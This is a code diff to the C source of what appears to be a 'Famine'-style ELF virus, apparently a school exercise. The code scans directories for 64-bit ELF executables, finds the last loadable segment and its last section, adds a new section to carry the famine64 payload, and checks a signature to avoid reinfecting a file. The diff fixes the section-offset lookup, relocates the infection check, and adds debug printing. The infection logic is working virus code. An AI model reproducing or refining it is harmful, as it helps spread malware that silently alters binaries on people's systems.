@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/06/12 05:43:13 by root             ###   ########.fr       */
+/*   Updated: 2018/06/12 11:21:45 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,7 +32,7 @@
 void			find_files(char *dir);
 void			get_dat_elf(char *dir, char *file);
 void			pack_dat_elf(char *path, int size, char *data);
-int				dat_elf_is_infected(char *data);
+int				dat_elf_is_infected(char *data, Elf64_Shdr *sec);
 void			famine64_func(void);
 extern uint32_t	famine64_size;
 extern uint32_t	famine64_data;
@@ -123,11 +123,10 @@ void	get_dat_elf(char *dir, char *file)
 
 void		pack_dat_elf(char *path, int size, char *data)
 {
+	printf("file   : %s\n", path);
 	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F' &&
-		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3) &&
-		!dat_elf_is_infected(data))
+		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
 	{
-
 		/* 1. Find the last PT_LOAD segment */
 		size_t	phoff = ((Elf64_Ehdr *)data)->e_phoff;
 		Elf64_Phdr *program = (Elf64_Phdr *)(data + phoff);
@@ -139,19 +138,23 @@ void		pack_dat_elf(char *path, int size, char *data)
 		}
 		if (iprogram == NULL) /* Weird if its NULL */
 			return ;
+		printf("OK\n");
 
 		/* 2. Find the last section of the last PT_LOAD */
 		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
 		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
 		Elf64_Shdr *isection = NULL;
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
-			if (section[i].sh_addr == iprogram->p_vaddr + iprogram->p_filesz) {
+			if (section[i].sh_offset == iprogram->p_offset + iprogram->p_filesz) {
 				isection = &section[i];
 			}
 		}
 		if (isection == NULL) /* Weird if its NULL */
 			return ;
+		printf("OK\n");
 
+		if (dat_elf_is_infected(data, isection))
+			return ;
 		Elf64_Shdr newsect;
 		newsect.sh_name = 0;
 		newsect.sh_type = SHT_PROGBITS;
@@ -213,9 +216,10 @@ void		pack_dat_elf(char *path, int size, char *data)
 	}
 }
 
-int		dat_elf_is_infected(char *data)
+int		dat_elf_is_infected(char *data, Elf64_Shdr *sec)
 {
-	uint64_t signature = *(uint64_t *)(data + ((Elf64_Ehdr *)data)->e_shoff - 16);
+	uint64_t signature = *(uint64_t *)(data + sec->sh_offset - 16);
+	printf("sign   : %#llx\n", signature);
 	if (((Elf64_Ehdr *)data)->e_ident[EI_DATA] == 1) // Little-endian
 		return (signature == 0x24EFAC2442CAFE42);
 	return (signature == 0x42CAFE4224EFAC24);
